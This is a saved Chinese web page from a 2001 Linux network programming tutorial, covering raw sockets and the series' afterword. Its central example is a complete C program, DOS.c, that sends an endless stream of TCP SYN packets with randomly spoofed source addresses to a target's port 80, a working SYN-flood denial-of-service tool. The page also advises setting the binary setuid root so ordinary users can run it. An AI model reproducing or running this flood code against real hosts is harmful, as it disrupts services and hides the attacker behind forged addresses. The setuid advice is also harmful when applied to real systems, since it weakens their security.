<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0056)http://fanqiang.chinaunix.net/a4/b7/20010508/112433.html -->
<HTML><HEAD><TITLE>[ 永远的UNIX > Linux网络编程--10. 原始套接字 --11. 后记 ]</TITLE>
<META http-equiv=Content-Type content="text/html; charset=gb2312">
<STYLE type=text/css>BODY {
	FONT: 12pt 宋体
}
TH {
	FONT: 12pt 宋体
}
INPUT {
	FONT: 12pt 宋体
}
SELECT {
	FONT: 12pt 宋体
}
TEXTAREA {
	FONT: 12pt 宋体
}
SELECT {
	FONT: 12pt 宋体
}
checkbox {
	FONT: 12pt 宋体
}
A:link {
	COLOR: #e6a306; TEXT-DECORATION: underline
}
A:visited {
	COLOR: #e6a306; TEXT-DECORATION: underline
}
A:hover {
	COLOR: #ffff00; TEXT-DECORATION: underline
}
BODY {
	FONT-SIZE: 12pt; FONT-FAMILY: "宋体", "serif"
}
TD {
	FONT-SIZE: 12pt; FONT-FAMILY: "宋体", "serif"
}
P {
	FONT-SIZE: 9pt; LINE-HEIGHT: 150%
}
</STYLE>

<META content="MSHTML 6.00.2900.3157" name=GENERATOR></HEAD>
<BODY text=#ffffff bgColor=#000000 
background="Linux网络编程--10_ 原始套接字 --11_ 后记 ].files/bline.gif">
<DIV align=center>
<CENTER>
<TABLE height=400 cellSpacing=0 cellPadding=0 width=750 border=0>
  <TBODY>
  <TR>
    <TD height=45>
      <P align=center><IMG alt="[ 永远的UNIX::UNIX技术资料的宝库 ]" 
      src="Linux网络编程--10_ 原始套接字 --11_ 后记 ].files/title.gif"></P></TD></TR>
  <TR>
  <TR>
    <TD vAlign=bottom align=left height=40><SMALL><A 
      href="http://fanqiang.chinaunix.net/">首页</A> &gt; 编程技术 &gt; 网络编程 &gt; 
      正文</SMALL></TD></TR>
  <TR>
    <TD width="100%" bgColor=#d09f0d colSpan=5 height=2><IMG height=1 
      src="Linux网络编程--10_ 原始套接字 --11_ 后记 ].files/c.gif" width=1></TD></TR>
  <TR>
    <TD vAlign=center align=middle height=40><FONT size=5><B>Linux网络编程--10. 
      原始套接字 --11. 后记</B></FONT></TD></TR>
  <TR>
    <TD align=middle height=20><FONT color=#999999><SMALL>http://linuxc.51.net 
      作者:hoyt<HOYTLUO@21CN.COM> (2001-05-08 11:26:09)</SMALL></FONT></TD></TR>
  <TR>
    <TD align=middle>
      <TABLE cellSpacing=0 cellPadding=0 width=700 align=center border=0>
        <TBODY>
        <TR>
          <TD vAlign=top><FONT color=#cccccc>10.&nbsp;原始套接字&nbsp; 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;我们在前面已经学习过了网络程序的两种套接字(SOCK_STREAM,SOCK_DRAGM).在这一章&nbsp;里面我们一起来学习另外一种套接字--原始套接字(SOCK_RAW).&nbsp;应用原始套接字,我们可以编写出由TCP和UDP套接字不能够实现的功能.&nbsp;注意原始套接字只能够由有root权限的人创建.&nbsp; 
            <BR><BR>10.1&nbsp;原始套接字的创建&nbsp; 
            <BR><BR>&nbsp;int&nbsp;sockfd(AF_INET,SOCK_RAW,protocol) 
            <BR><BR>可以创建一个原始套接字.根据协议的类型不同我们可以创建不同类型的原始套接字&nbsp;比如:IPPROTO_ICMP,IPPROTO_TCP,IPPROTO_UDP等等.详细的情况查看&nbsp;<NETINET 
            in.h>&nbsp;下面我们以一个实例来说明原始套接字的创建和使用&nbsp; 
            <BR><BR>10.2&nbsp;一个原始套接字的实例&nbsp; 
            <BR>还记得DOS是什么意思吗?在这里我们就一起来编写一个实现DOS的小程序.&nbsp;下面是程序的源代码&nbsp; 
            <BR><BR>/********************&nbsp;&nbsp;DOS.c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*****************/ 
            <BR>#include&nbsp;<SYS socket.h> <BR>#include&nbsp;<NETINET in.h> 
            <BR>#include&nbsp;<NETINET ip.h> <BR>#include&nbsp;<NETINET tcp.h> 
            <BR>#include&nbsp;<STDLIB.H> <BR>#include&nbsp;<ERRNO.H> 
            <BR>#include&nbsp;<UNISTD.H> <BR>#include&nbsp;<STDIO.H> 
            <BR>#include&nbsp;<NETDB.H> 
            <BR><BR>#define&nbsp;DESTPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;要攻击的端口(WEB)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/ 
            <BR>#define&nbsp;LOCALPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8888 
            <BR><BR>void&nbsp;send_tcp(int&nbsp;sockfd,struct&nbsp;sockaddr_in&nbsp;*addr); 
            <BR>unsigned&nbsp;short&nbsp;check_sum(unsigned&nbsp;short&nbsp;*addr,int&nbsp;len); 
            <BR><BR>int&nbsp;main(int&nbsp;argc,char&nbsp;**argv) <BR>{ 
            <BR>&nbsp;int&nbsp;sockfd; 
            <BR>&nbsp;struct&nbsp;sockaddr_in&nbsp;addr; 
            <BR>&nbsp;struct&nbsp;hostent&nbsp;*host; <BR>&nbsp;int&nbsp;on=1; 
            <BR>&nbsp; <BR>&nbsp;if(argc!=2) <BR>&nbsp;{ 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(stderr,"Usage:%s&nbsp;hostname\n\a",argv[0]); 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1); 
            <BR>&nbsp;} <BR>&nbsp; 
            <BR>&nbsp;bzero(&amp;addr,sizeof(struct&nbsp;sockaddr_in)); 
            <BR>&nbsp;addr.sin_family=AF_INET; 
            <BR>&nbsp;addr.sin_port=htons(DESTPORT); <BR>&nbsp; 
            <BR>&nbsp;if(inet_aton(argv[1],&amp;addr.sin_addr)==0) <BR>&nbsp;{ 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;host=gethostbyname(argv[1]); 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(host==NULL) 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{ 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(stderr,"HostName&nbsp;Error:%s\n\a",hstrerror(h_errno)); 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1); 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr.sin_addr=*(struct&nbsp;in_addr&nbsp;*)(host-&gt;h_addr_list[0]); 
            <BR>&nbsp;} <BR>&nbsp; 
            <BR>&nbsp;/****&nbsp;使用IPPROTO_TCP创建一个TCP的原始套接字&nbsp;&nbsp;&nbsp;&nbsp;****/ 
            <BR><BR>&nbsp;sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP); 
            <BR>&nbsp;if(sockfd&lt;0) <BR>&nbsp;{ 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(stderr,"Socket&nbsp;Error:%s\n\a",strerror(errno)); 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1); 
            <BR>&nbsp;} 
            <BR>/********&nbsp;&nbsp;设置IP数据包格式,告诉系统内核模块IP数据包由我们自己来填写&nbsp;&nbsp;***/ 
            <BR>&nbsp; 
            <BR>setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&amp;on,sizeof(on)); 
            <BR><BR>/****&nbsp;&nbsp;没有办法,只用超级护用户才可以使用原始套接字&nbsp;&nbsp;&nbsp;&nbsp;*********/ 
            <BR>&nbsp;setuid(getpid()); 
            <BR><BR>/*********&nbsp;&nbsp;发送炸弹了!!!!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;****/ 
            <BR>&nbsp;send_tcp(sockfd,&amp;addr); <BR>}&nbsp; 
            <BR><BR><BR><BR>/*******&nbsp;&nbsp;发送炸弹的实现&nbsp;&nbsp;&nbsp;*********/ 
            <BR>void&nbsp;send_tcp(int&nbsp;sockfd,struct&nbsp;sockaddr_in&nbsp;*addr) 
            <BR>{ 
            <BR>&nbsp;char&nbsp;buffer[100];&nbsp;&nbsp;/****&nbsp;用来放置我们的数据包&nbsp;&nbsp;****/ 
            <BR>&nbsp;struct&nbsp;ip&nbsp;*ip; 
            <BR>&nbsp;struct&nbsp;tcphdr&nbsp;*tcp; <BR>&nbsp;int&nbsp;head_len; 
            <BR>&nbsp; 
            <BR>&nbsp;/*******&nbsp;我们的数据包实际上没有任何内容,所以长度就是两个结构的长度&nbsp;&nbsp;***/ 
            <BR>&nbsp; 
            <BR>&nbsp;head_len=sizeof(struct&nbsp;ip)+sizeof(struct&nbsp;tcphdr); 
            <BR>&nbsp; <BR>&nbsp;bzero(buffer,100); 
            <BR><BR>&nbsp;/********&nbsp;&nbsp;填充IP数据包的头部,还记得IP的头格式吗?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;******/&nbsp; 
            <BR>&nbsp;ip=(struct&nbsp;ip&nbsp;*)buffer; 
            <BR>&nbsp;ip-&gt;ip_v=IPVERSION;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&nbsp;版本一般的是&nbsp;4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**/ 
            <BR>&nbsp;ip-&gt;ip_hl=sizeof(struct&nbsp;ip)&gt;&gt;2;&nbsp;/**&nbsp;IP数据包的头部长度&nbsp;&nbsp;**/ 
            <BR>&nbsp;ip-&gt;ip_tos=0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&nbsp;服务类型&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**/ 
            <BR>&nbsp;ip-&gt;ip_len=htons(head_len);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&nbsp;IP数据包的长度&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**/ 
            <BR>&nbsp;ip-&gt;ip_id=0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&nbsp;让系统去填写吧&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**/ 
            <BR>&nbsp;ip-&gt;ip_off=0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&nbsp;和上面一样,省点时间&nbsp;**/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
            <BR>&nbsp;ip-&gt;ip_ttl=MAXTTL;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&nbsp;最长的时间&nbsp;&nbsp;&nbsp;255&nbsp;&nbsp;&nbsp;&nbsp;**/ 
            <BR>&nbsp;ip-&gt;ip_p=IPPROTO_TCP;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&nbsp;我们要发的是&nbsp;TCP包&nbsp;&nbsp;**/&nbsp; 
            <BR>&nbsp;ip-&gt;ip_sum=0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&nbsp;校验和让系统去做&nbsp;&nbsp;&nbsp;&nbsp;**/ 
            <BR>&nbsp;ip-&gt;ip_dst=addr-&gt;sin_addr;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&nbsp;我们攻击的对象&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**/ 
            <BR>&nbsp; 
            <BR>&nbsp;/*******&nbsp;&nbsp;开始填写TCP数据包&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*****/ 
            <BR>&nbsp;tcp=(struct&nbsp;tcphdr&nbsp;*)(buffer&nbsp;+sizeof(struct&nbsp;ip)); 
            <BR>&nbsp;tcp-&gt;source=htons(LOCALPORT); 
            <BR>&nbsp;tcp-&gt;dest=addr-&gt;sin_port;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&nbsp;目的端口&nbsp;&nbsp;&nbsp;&nbsp;**/ 
            <BR>&nbsp;tcp-&gt;seq=random(); <BR>&nbsp;tcp-&gt;ack_seq=0; 
            <BR>&nbsp;tcp-&gt;doff=5; 
            <BR>&nbsp;tcp-&gt;syn=1;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&nbsp;我要建立连接&nbsp;**/ 
            <BR>&nbsp;tcp-&gt;check=0; <BR><BR>&nbsp; 
            <BR>&nbsp;/**&nbsp;好了,一切都准备好了.服务器,你准备好了没有??&nbsp;^_^&nbsp;&nbsp;**/ 
            <BR>&nbsp;while(1) <BR>&nbsp;&nbsp;{ 
            <BR>&nbsp;/**&nbsp;&nbsp;你不知道我是从那里来的,慢慢的去等吧!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**/ 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;ip-&gt;ip_src.s_addr=random();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
            <BR><BR>&nbsp;/**&nbsp;什么都让系统做了,也没有多大的意思,还是让我们自己来校验头部吧&nbsp;*/ 
            <BR>&nbsp;/**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面这条可有可无&nbsp;&nbsp;&nbsp;&nbsp;*/ 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;tcp-&gt;check=check_sum((unsigned&nbsp;short&nbsp;*)tcp, 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sizeof(struct&nbsp;tcphdr));&nbsp; 
            <BR>&nbsp;&nbsp;&nbsp;&nbsp;sendto(sockfd,buffer,head_len,0,addr,sizeof(struct&nbsp;sockaddr_in)); 
            <BR>&nbsp;&nbsp;} <BR>} <BR><BR>/*&nbsp;下面是首部校验和的算法,偷了别人的&nbsp;*/ 
            <BR>unsigned&nbsp;short&nbsp;check_sum(unsigned&nbsp;short&nbsp;*addr,int&nbsp;len) 
            <BR>{ <BR>&nbsp;register&nbsp;int&nbsp;nleft=len; 
            <BR>&nbsp;register&nbsp;int&nbsp;sum=0; 
            <BR>&nbsp;register&nbsp;short&nbsp;*w=addr; 
            <BR>&nbsp;&nbsp;short&nbsp;answer=0; <BR>&nbsp; 
            <BR>&nbsp;while(nleft&gt;1) <BR>&nbsp;{ <BR>&nbsp;&nbsp;sum+=*w++; 
            <BR>&nbsp;&nbsp;nleft-=2; <BR>&nbsp;} <BR>&nbsp;if(nleft==1) 
            <BR>&nbsp;{ 
            <BR>&nbsp;&nbsp;*(unsigned&nbsp;char&nbsp;*)(&amp;answer)=*(unsigned&nbsp;char&nbsp;*)w; 
            <BR>&nbsp;&nbsp;sum+=answer; <BR>&nbsp;} <BR>&nbsp;&nbsp; 
            <BR>&nbsp;sum=(sum&gt;&gt;16)+(sum&amp;0xffff); 
            <BR>&nbsp;sum+=(sum&gt;&gt;16); <BR>&nbsp;answer=~sum; 
            <BR>&nbsp;return(answer); <BR>} 
            <BR><BR>编译一下,拿localhost做一下实验,看看有什么结果.(千万不要试别人的啊).&nbsp;为了让普通用户可以运行这个程序,我们应该将这个程序的所有者变为root,且&nbsp;设置setuid位&nbsp; 
            <BR><BR>&nbsp;[root@hoyt&nbsp;/root]#chown&nbsp;root&nbsp;DOS 
            <BR>&nbsp;[root@hoyt&nbsp;/root]#chmod&nbsp;+s&nbsp;DOS 
            <BR><BR><BR>10.3&nbsp;总结&nbsp; 
            <BR>原始套接字和一般的套接字不同的是以前许多由系统做的事情,现在要由我们自己来做了.&nbsp;不过这里面是不是有很多的乐趣呢.&nbsp;当我们创建了一个TCP套接字的时候,我们只是负责把我们要发送的内容(buffer)传递给了系统.&nbsp;系统在收到我们的数据后,回自动的调用相应的模块给数据加上TCP头部,然后加上IP头部.&nbsp;再发送出去.而现在是我们自己创建各个的头部,系统只是把它们发送出去.&nbsp;在上面的实例中,由于我们要修改我们的源IP地址,所以我们使用了setsockopt函数,如果我们只是修改TCP数据,那么IP数据一样也可以由系统来创建的.&nbsp; 
            <BR><BR>-------------------------------------------------------------------------------- 
            <BR><BR>11.&nbsp;后记 
            <BR>&nbsp;&nbsp;总算完成了网络编程这个教程.算起来我差不多写了一个星期,原来以为写这个应该是一件&nbsp;不难的事,做起来才知道原来有很多的地方都比我想象的要难.我还把很多的东西都省略掉了&nbsp;不过写完了这篇教程以后,我好象对网络的认识又增加了一步.&nbsp; 
            <BR><BR>&nbsp;&nbsp;如果我们只是编写一般的&nbsp;网络程序还是比较容易的,但是如果我们想写出比较好的网络程序我们还有着遥远的路要走.&nbsp;网络程序一般的来说都是多进程加上多线程的.为了处理好他们内部的关系,我们还要学习&nbsp;进程之间的通信.在网络程序里面有着许许多多的突发事件,为此我们还要去学习更高级的&nbsp;事件处理知识.现在的信息越来越多了,为了处理好这些信息,我们还要去学习数据库.&nbsp;如果要编写出有用的黑客软件,我们还要去熟悉各种网络协议.总之我们要学的东西还很多很多.&nbsp; 
            <BR><BR>&nbsp;&nbsp;看一看外国的软件水平,看一看印度的软件水平,宝岛台湾的水平,再看一看我们自己的&nbsp;软件水平大家就会知道了什么叫做差距.我们现在用的软件有几个是我们中国人自己编写的.&nbsp;&nbsp; 
            <BR><BR>&nbsp;&nbsp;不过大家不要害怕,不用担心.只要我们还是清醒的,还能够认清我们和别人的差距,&nbsp;我们就还有希望.&nbsp;毕竟我们现在还年轻.只要我们努力,认真的去学习,我们一定能够学好的.我们就可以追上别人直到超过别人!&nbsp; 
            <BR><BR>相信一点:&nbsp; 
            <BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;别人可以做到的我们一样可以做到,而且可以比别人做的更好!&nbsp; 
            <BR><BR>&nbsp;&nbsp;&nbsp;勇敢的年轻人,为了我们伟大祖国的软件产业,为了祖国的未来,努力的去奋斗吧!祖国会记住你们的!&nbsp; 
            <BR><BR><BR>hoyt&nbsp; <BR><BR>11.1&nbsp;参考资料&nbsp; 
            <BR>&lt;&lt;实用UNIX编程&gt;&gt;---机械工业出版社.&nbsp; 
            <BR><BR>&lt;<LINUX网络编程>&gt;--清华大学出版社.&nbsp; 
            <BR><BR><BR>-------------------------------------------------------------------------------- 
            <BR><BR>(<A 
            href="http://www.fanqiang.com/">http://www.fanqiang.com/</A>) 
            </FONT>&nbsp;&nbsp;&nbsp;&nbsp;进入【<A 
            href="http://www.chinaunix.net/">UNIX论坛</A>】 </TD></TR>
        <TR>
          <TD>
            <HR>
          </TD></TR>
        <TR>
          <TD><B>相关文章</B> </TD></TR>
        <TR>
          <TD><A 
            href="http://fanqiang.chinaunix.net/a4/b7/20010810/1200001101.html">Proxy源代码分析--谈谈如何学习linux网络编程</A> 
            <SMALL>(2001-08-10 12:00:00)</SMALL></FONT><BR><A 
            href="http://fanqiang.chinaunix.net/a4/b7/20010508/112433.html">Linux网络编程--10. 
            原始套接字 --11. 后记</A> <SMALL>(2001-05-08 11:26:09)</SMALL></FONT><BR><A 
            href="http://fanqiang.chinaunix.net/a4/b7/20010508/112359.html">Linux网络编程--9. 
            服务器模型</A> <SMALL>(2001-05-08 11:23:59)</SMALL></FONT><BR><A 
            href="http://fanqiang.chinaunix.net/a4/b7/20010508/112324.html">Linux网络编程--8. 
            套接字选项</A> <SMALL>(2001-05-08 11:23:24)</SMALL></FONT><BR><A 
            href="http://fanqiang.chinaunix.net/a4/b7/20010508/112240.html">Linux网络编程--7. 
            TCP/IP协议</A> <SMALL>(2001-05-08 11:22:40)</SMALL></FONT><BR><A 
            href="http://fanqiang.chinaunix.net/a4/b7/20010508/112209.html">Linux网络编程--6. 
            高级套接字函数</A> <SMALL>(2001-05-08 11:22:09)</SMALL></FONT><BR><A 
            href="http://fanqiang.chinaunix.net/a4/b7/20010508/112131.html">Linux网络编程--5. 
            用户数据报发送</A> <SMALL>(2001-05-08 11:21:31)</SMALL></FONT><BR><A 
            href="http://fanqiang.chinaunix.net/a4/b7/20010508/112052.html">Linux网络编程--4. 
            完整的读写函数</A> <SMALL>(2001-05-08 11:20:52)</SMALL></FONT><BR><A 
            href="http://fanqiang.chinaunix.net/a4/b7/20010508/112014.html">Linux网络编程--3. 
            服务器和客户机的信息函数</A> <SMALL>(2001-05-08 11:20:14)</SMALL></FONT><BR><A 
            href="http://fanqiang.chinaunix.net/a4/b7/20010508/111934.html">Linux网络编程--2. 
            初等网络函数介绍（TCP）</A> <SMALL>(2001-05-08 
        11:19:34)</SMALL></FONT><BR></TD></TR>
        <TR>
        <TR>
          <TD><BR>===<A 
            href="http://fanqiang.chinaunix.net/cgi-bin/find.cgi?key=Linux网络编程">更多相关</A>===</TD></TR>
        <TR>
          <TD>&nbsp;</TD></TR></TBODY></TABLE></TD></TR>
  <TR>
    <TD width="100%" bgColor=#d09f0d colSpan=5 height=2><IMG height=1 
      src="Linux网络编程--10_ 原始套接字 --11_ 后记 ].files/c.gif" width=1></TD></TR>
  <TR>
    <TD vAlign=top width="100%" colSpan=5 height=40>
      <P align=center><FONT color=#ffffff>★&nbsp;&nbsp;樊强制作 欢迎分享&nbsp;&nbsp;★ 
      </FONT></P></TD></TR></TBODY></TABLE></CENTER></DIV></BODY></HTML>
